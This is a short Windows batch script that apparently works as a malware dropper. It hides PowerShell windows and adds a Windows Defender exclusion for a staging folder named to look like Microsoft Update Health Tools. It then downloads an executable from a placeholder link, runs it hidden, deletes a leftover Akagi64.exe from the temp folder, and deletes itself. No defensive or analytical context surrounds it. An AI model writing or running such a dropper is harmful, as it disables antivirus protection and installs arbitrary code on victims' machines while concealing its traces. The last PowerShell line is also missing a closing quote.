@echo off
set SystemRoot=C:\Windows
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"

if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'linkkk' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
cd /d "%STAGE%"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\test.exe' -WindowStyle Hidden


start "" /b cmd /c "ping -n 11 127.0.0.1 >nul & del /f /q ""%TEMP%\Akagi64.exe"""

(goto) 2>nul & del "%~f0"
